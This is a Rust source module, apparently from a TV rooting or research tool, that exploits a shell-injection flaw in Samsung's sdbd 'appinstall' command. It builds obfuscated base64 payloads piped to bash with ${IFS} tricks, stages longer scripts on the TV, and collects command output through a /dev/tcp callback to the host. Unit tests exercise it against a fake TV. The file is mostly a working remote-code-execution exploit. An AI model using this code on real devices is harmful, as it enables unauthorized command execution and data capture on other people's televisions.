//! Samsung sdbd shell-injection transport and callback capture.
//!
//! The on-TV exploit entry point is a package-name command substitution. A
//! direct injection is kept below the observed 448-byte safe threshold; longer
//! commands are staged as a script and sourced. The hard appinstall argument
//! limit is 510 bytes. Callback output is bounded and only accepted from the
//! resolved TV address.

use crate::error::{Error, Result};
use base64::engine::general_purpose::STANDARD;
use base64::Engine;
use std::io::Read;
use std::net::{IpAddr, Shutdown, TcpListener, TcpStream, ToSocketAddrs, UdpSocket};
use std::time::{Duration, Instant};
use tv_sdb::{connection::with_default_port, Device, Options};

pub const APPINSTALL_PREFIX: &str = "0 appinstall tpk ";
pub const APPINSTALL_MAX_SAFE_BYTES: usize = 510;
pub const CAPTURE_DIRECT_MAX_SAFE_BYTES: usize = 448;
pub const REMOTE_SCRIPT_DIR: &str = "/home/owner/share/tmp/sdk_tools";
pub const DEFAULT_CAPTURE_TIMEOUT: Duration = Duration::from_secs(30);
pub const MAX_CAPTURE_OUTPUT: usize = 4 * 1024 * 1024;

#[derive(Debug, Clone)]
pub struct CaptureConfig {
    /// Address the TV connects back to; defaults to the host route to the TV.
    pub callback_host: Option<String>,
    /// Local bind address; defaults to `callback_host`.
    pub bind_host: Option<String>,
    pub port: u16,
    pub timeout: Duration,
    pub max_output: usize,
    /// Test seam; production always generates a fresh random marker token.
    pub marker_token: Option<String>,
}

impl Default for CaptureConfig {
    fn default() -> Self {
        Self {
            callback_host: None,
            bind_host: None,
            port: 0,
            timeout: DEFAULT_CAPTURE_TIMEOUT,
            max_output: MAX_CAPTURE_OUTPUT,
            marker_token: None,
        }
    }
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Capture {
    pub output: String,
    pub marker_token: String,
}

/// Builds the sdbd `0 appinstall` shell-injection argument body.
pub fn build_shell_injection(command: &str, gate_token: Option<&str>) -> Result<String> {
    let token = match gate_token {
        Some(token) if !token.is_empty() && token.bytes().all(|b| b.is_ascii_hexdigit()) => {
            token.to_ascii_lowercase()
        }
        Some(_) => {
            return Err(Error::protocol(
                "shell injection gate token must be lowercase hexadecimal",
            ))
        }
        None => random_hex(8)?,
    };
    let script = format!("/bin/mkdir /tmp/s-{token} 2>/dev/null&&{{ {command};}}");
    let encoded = STANDARD.encode(script);
    Ok(format!(
        "new2.tpk`printf${{IFS}}%s${{IFS}}{encoded}|base64${{IFS}}-d|bash`.tpk"
    ))
}

pub fn injection_argument_size(command: &str) -> Result<usize> {
    Ok(format!(
        "{APPINSTALL_PREFIX}{}",
        build_shell_injection(command, Some(&"0".repeat(16)))?
    )
    .len())
}

/// Runs one injection on an existing device connection.
pub fn inject(device: &mut Device, command: &str) -> Result<Vec<u8>> {
    let injection = build_shell_injection(command, None)?;
    let argument = format!("{APPINSTALL_PREFIX}{injection}");
    if argument.len() > APPINSTALL_MAX_SAFE_BYTES {
        return Err(Error::protocol(format!(
            "SDB appinstall injection is {} bytes; maximum safe size is {APPINSTALL_MAX_SAFE_BYTES}",
            argument.len()
        )));
    }
    let mut output = Vec::new();
    device.shell(&argument, &mut output).map_err(Error::sdb)?;
    Ok(output)
}

/// Opens its own connection for a single injection.
pub fn inject_once(target: &str, options: &Options, command: &str) -> Result<Vec<u8>> {
    let mut device = Device::connect(target, options).map_err(Error::sdb)?;
    inject(&mut device, command)
}

/// Captures one command's output through a TCP callback.
pub fn capture(
    target: &str,
    options: &Options,
    command: &str,
    config: &CaptureConfig,
) -> Result<Capture> {
    let ips = resolve_target(target)?;
    let callback = config
        .callback_host
        .clone()
        .unwrap_or(route_callback_host(target)?);
    let bind = config.bind_host.clone().unwrap_or_else(|| callback.clone());
    let listener = TcpListener::bind((bind.as_str(), config.port)).map_err(|error| {
        Error::Io(std::io::Error::new(
            error.kind(),
            format!(
                "cannot listen for TV callback on {bind}:{}: {error}",
                config.port
            ),
        ))
    })?;
    let port = listener.local_addr()?.port();
    let token = match &config.marker_token {
        Some(token) => token.clone(),
        None => random_hex(8)?,
    };
    let marker = exit_marker(&token);
    let wrapped = format!(
        "exec 3<>/dev/tcp/{callback}:{port};{{ {command}; }} >&3 2>&3;printf '\\n{marker}%s]\\n' \"$?\" >&3;exec 3>&-"
    );
    let launch = if injection_argument_size(&wrapped)? > CAPTURE_DIRECT_MAX_SAFE_BYTES {
        stage_script(target, options, &wrapped)?
    } else {
        wrapped
    };
    if injection_argument_size(&launch)? > APPINSTALL_MAX_SAFE_BYTES {
        return Err(Error::protocol(
            "staged launch still exceeds the appinstall limit",
        ));
    }

    let target_owned = target.to_owned();
    let options = options.clone();
    let launch_for_thread = launch.clone();
    let mut injection = Some(std::thread::spawn(move || -> Result<()> {
        inject_once(&target_owned, &options, &launch_for_thread).map(|_| ())
    }));

    listener.set_nonblocking(true)?;
    let deadline = Instant::now() + config.timeout;
    let (mut stream, peer) = loop {
        match listener.accept() {
            Ok(accepted) => break accepted,
            Err(error) if error.kind() == std::io::ErrorKind::WouldBlock => {
                // A refused or failed injection can never produce a callback.
                // Surface that error immediately instead of waiting out the
                // whole callback deadline.
                if injection
                    .as_ref()
                    .is_some_and(std::thread::JoinHandle::is_finished)
                {
                    let finished = injection.take().expect("checked above");
                    match finished.join() {
                        Ok(Ok(())) => {}
                        Ok(Err(error)) => return Err(error),
                        Err(_) => return Err(Error::protocol("injection thread panicked")),
                    }
                }
                if Instant::now() >= deadline {
                    return Err(Error::protocol(
                        "TV did not connect to the callback within the deadline; check the inbound firewall and Developer Mode host IP",
                    ));
                }
                std::thread::sleep(Duration::from_millis(20));
            }
            Err(error) => return Err(Error::sdb(error)),
        }
    };
    if !ips.contains(&peer.ip()) {
        return Err(Error::protocol(format!(
            "callback came from {}, not the resolved TV address",
            peer.ip()
        )));
    }
    stream.set_nonblocking(false)?;
    let remaining = deadline.saturating_duration_since(Instant::now());
    if remaining.is_zero() {
        return Err(Error::protocol("TV callback deadline expired"));
    }
    stream.set_read_timeout(Some(remaining))?;
    let output = read_bounded(&mut stream, config.max_output, deadline)?;
    let _ = stream.shutdown(Shutdown::Both);

    if let Some(injection) = injection {
        injection
            .join()
            .map_err(|_| Error::protocol("injection thread panicked"))??;
    }
    Ok(Capture {
        output: String::from_utf8_lossy(&output).into_owned(),
        marker_token: token,
    })
}

fn resolve_target(target: &str) -> Result<Vec<IpAddr>> {
    let address = with_default_port(target);
    let ips: Vec<IpAddr> = address
        .to_socket_addrs()
        .map_err(Error::sdb)?
        .map(|address| address.ip())
        .collect();
    if ips.is_empty() {
        return Err(Error::protocol(format!(
            "cannot resolve TV address {target:?}"
        )));
    }
    Ok(ips)
}

/// The host address the TV should connect back to: the source address of the
/// host's route to the TV, not a guess from interface order.
pub fn route_callback_host(target: &str) -> Result<String> {
    let host = match target.rsplit_once(':') {
        Some((host, port)) if port.parse::<u16>().is_ok() => host,
        _ => target,
    };
    let socket = UdpSocket::bind("0.0.0.0:0").map_err(Error::sdb)?;
    socket.connect((host, 9)).map_err(Error::sdb)?;
    Ok(socket.local_addr().map_err(Error::sdb)?.ip().to_string())
}

fn read_bounded(stream: &mut TcpStream, maximum: usize, deadline: Instant) -> Result<Vec<u8>> {
    let mut output = Vec::new();
    let mut buffer = [0u8; 64 * 1024];
    loop {
        if Instant::now() >= deadline {
            return Err(Error::protocol("TV callback stopped responding"));
        }
        match stream.read(&mut buffer) {
            Ok(0) => return Ok(output),
            Ok(count) => {
                if output.len() + count > maximum {
                    return Err(Error::protocol(format!(
                        "TV callback output exceeds the {maximum}-byte limit"
                    )));
                }
                output.extend_from_slice(&buffer[..count]);
            }
            Err(error)
                if matches!(
                    error.kind(),
                    std::io::ErrorKind::WouldBlock | std::io::ErrorKind::TimedOut
                ) =>
            {
                return Err(Error::protocol("TV callback stopped responding"));
            }
            Err(error) => return Err(Error::sdb(error)),
        }
    }
}

fn stage_script(target: &str, options: &Options, wrapped: &str) -> Result<String> {
    let remote = format!("{REMOTE_SCRIPT_DIR}/.tv-root-capture-{}.sh", random_hex(8)?);
    let path = std::env::temp_dir().join(format!(
        "tv-root-capture-{}-{}.sh",
        std::process::id(),
        random_hex(4)?
    ));
    let script = format!("/bin/rm -f {remote}\n{wrapped}\n");
    std::fs::write(&path, script)?;
    let result = (|| {
        let mut device = Device::connect(target, options).map_err(Error::sdb)?;
        device.push(&path, &remote).map_err(Error::sdb)?;
        Ok(format!(". {remote}"))
    })();
    let _ = std::fs::remove_file(&path);
    result
}

pub fn exit_marker(token: &str) -> String {
    format!("[exit:{token}:")
}

/// Extracts exactly one `[exit:<token>:<status>]` marker and returns the
/// command output before it.
pub fn validate_exit(capture: &Capture, token: &str) -> Result<(String, i32)> {
    let marker = exit_marker(token);
    let mut found: Option<(usize, i32)> = None;
    let mut cursor = 0;
    let output = &capture.output;
    while let Some(offset) = output[cursor..].find(&marker) {
        let start = cursor + offset;
        let rest = &output[start + marker.len()..];
        let Some(end) = rest.find(']') else {
            return Err(Error::protocol("malformed remote exit marker"));
        };
        let value = &rest[..end];
        if value.is_empty() || !value.bytes().all(|byte| byte.is_ascii_digit()) {
            return Err(Error::protocol("malformed remote exit status"));
        }
        if found.is_some() {
            return Err(Error::protocol("duplicate remote exit marker"));
        }
        let status = value
            .parse()
            .map_err(|_| Error::protocol("remote exit status is out of range"))?;
        found = Some((start, status));
        cursor = start + marker.len() + end + 1;
    }
    let Some((start, status)) = found else {
        return Err(Error::protocol("remote exit marker was not observed"));
    };
    let marker_end = output[start..]
        .find(']')
        .map(|end| start + end + 1)
        .ok_or_else(|| Error::protocol("malformed remote exit marker"))?;
    if !output[marker_end..].trim().is_empty() {
        return Err(Error::protocol(
            "unexpected output after remote exit marker",
        ));
    }
    let body = output[..start].trim_end().to_owned();
    Ok((body, status))
}

pub fn random_hex(bytes: usize) -> Result<String> {
    let mut buffer = vec![0u8; bytes];
    getrandom::getrandom(&mut buffer)
        .map_err(|error| Error::Io(std::io::Error::other(error.to_string())))?;
    Ok(buffer.iter().map(|byte| format!("{byte:02x}")).collect())
}

/// Quotes one argv element for the TV's `/bin/sh`.
pub fn shell_quote(value: &str) -> String {
    if !value.is_empty()
        && value
            .bytes()
            .all(|byte| byte.is_ascii_alphanumeric() || b"@%_+=:,./-".contains(&byte))
    {
        return value.to_owned();
    }
    format!("'{}'", value.replace('\'', "'\\''"))
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::io::Write;
    use std::net::TcpListener;
    use tv_sdb::frame::{Frame, CLSE, CNXN, OKAY, OPEN, WRTE};

    #[test]
    fn injection_is_bounded_and_encodes_the_command() {
        let injection = build_shell_injection("id", Some(&"a".repeat(16))).unwrap();
        assert!(injection.starts_with("new2.tpk`printf${IFS}%s${IFS}"));
        assert!(injection.ends_with("|base64${IFS}-d|bash`.tpk"));
        let encoded = injection
            .split("${IFS}")
            .nth(2)
            .unwrap()
            .split("|base64")
            .next()
            .unwrap();
        let decoded = STANDARD.decode(encoded).unwrap();
        assert_eq!(
            decoded,
            b"/bin/mkdir /tmp/s-aaaaaaaaaaaaaaaa 2>/dev/null&&{ id;}"
        );
        assert!(injection_argument_size(&"x".repeat(300)).unwrap() > 448);
        assert!(build_shell_injection("id", Some("nope")).is_err());
    }

    #[test]
    fn exit_marker_must_be_unique_and_well_formed() {
        let capture = Capture {
            output: "hello\n[exit:abc:0]\n".into(),
            marker_token: "abc".into(),
        };
        assert_eq!(validate_exit(&capture, "abc").unwrap(), ("hello".into(), 0));
        let duplicate = Capture {
            output: "[exit:abc:0]\n[exit:abc:0]\n".into(),
            marker_token: "abc".into(),
        };
        assert!(validate_exit(&duplicate, "abc").is_err());
        let malformed = Capture {
            output: "[exit:abc:x]\n".into(),
            marker_token: "abc".into(),
        };
        assert!(validate_exit(&malformed, "abc").is_err());
        let missing = Capture {
            output: "hello\n".into(),
            marker_token: "abc".into(),
        };
        assert!(validate_exit(&missing, "abc").is_err());
    }

    #[test]
    fn shell_quote_keeps_simple_arguments_plain() {
        assert_eq!(shell_quote("id"), "id");
        assert_eq!(shell_quote("a b"), "'a b'");
        assert_eq!(shell_quote("it's"), "'it'\\''s'");
    }

    /// A scripted sdbd that opens the callback named in the injected command.
    #[test]
    fn capture_round_trips_through_a_fake_tv() {
        let sdb = TcpListener::bind("127.0.0.1:0").unwrap();
        let target = sdb.local_addr().unwrap().to_string();
        let server = std::thread::spawn(move || {
            let (stream, _) = sdb.accept().unwrap();
            serve_one(stream);
        });
        let config = CaptureConfig {
            callback_host: Some("127.0.0.1".into()),
            bind_host: Some("127.0.0.1".into()),
            timeout: Duration::from_secs(5),
            marker_token: Some("deadbeefdeadbeef".into()),
            ..CaptureConfig::default()
        };
        let capture = capture(
            &target,
            &Options {
                timeout: Duration::from_secs(5),
                verbose: false,
            },
            "printf hello",
            &config,
        )
        .unwrap();
        assert_eq!(
            validate_exit(&capture, "deadbeefdeadbeef").unwrap(),
            ("hello".into(), 0)
        );
        server.join().unwrap();
    }

    #[test]
    fn a_refused_injection_does_not_wait_for_the_callback_deadline() {
        let sdb = TcpListener::bind("127.0.0.1:0").unwrap();
        let target = sdb.local_addr().unwrap().to_string();
        let server = std::thread::spawn(move || {
            let (mut stream, _) = sdb.accept().unwrap();
            let cnxn = Frame::read(&mut stream).unwrap();
            assert_eq!(cnxn.command, CNXN);
            stream
                .write_all(&Frame::new(CNXN, 0x0200_0000, 4096, *b"device::FAKE::0\0").encode())
                .unwrap();
            let open = Frame::read(&mut stream).unwrap();
            assert_eq!(open.command, OPEN);
            stream
                .write_all(&Frame::new(CLSE, 0, open.arg0, Vec::new()).encode())
                .unwrap();
        });
        let started = Instant::now();
        let error = capture(
            &target,
            &Options {
                timeout: Duration::from_secs(5),
                verbose: false,
            },
            "echo hello",
            &CaptureConfig {
                callback_host: Some("127.0.0.1".into()),
                bind_host: Some("127.0.0.1".into()),
                timeout: Duration::from_secs(5),
                ..CaptureConfig::default()
            },
        )
        .unwrap_err();
        assert!(error.to_string().contains("refused service"), "{error}");
        assert!(started.elapsed() < Duration::from_secs(3));
        server.join().unwrap();
    }

    fn serve_one(mut stream: TcpStream) {
        let cnxn = Frame::read(&mut stream).unwrap();
        assert_eq!(cnxn.command, CNXN);
        stream
            .write_all(&Frame::new(CNXN, 0x0200_0000, 4096, *b"device::FAKE::0\0").encode())
            .unwrap();
        let open = Frame::read(&mut stream).unwrap();
        assert_eq!(open.command, OPEN);
        let service = String::from_utf8(open.data).unwrap();
        let service = service.trim_end_matches('\0');
        stream
            .write_all(&Frame::new(OKAY, 1, open.arg0, Vec::new()).encode())
            .unwrap();
        assert!(service.starts_with("shell:0 appinstall tpk "), "{service}");
        let encoded = service
            .split("${IFS}")
            .nth(2)
            .unwrap()
            .split("|base64")
            .next()
            .unwrap();
        let decoded = String::from_utf8(STANDARD.decode(encoded).unwrap()).unwrap();
        let callback = decoded
            .split("/dev/tcp/")
            .nth(1)
            .unwrap()
            .split(';')
            .next()
            .unwrap();
        let mut callback = TcpStream::connect(callback).unwrap();
        callback
            .write_all(b"hello\n[exit:deadbeefdeadbeef:0]\n")
            .unwrap();
        drop(callback);
        stream
            .write_all(&Frame::new(WRTE, 1, open.arg0, b"").encode())
            .unwrap();
        stream
            .write_all(&Frame::new(CLSE, 0, open.arg0, Vec::new()).encode())
            .unwrap();
    }
}
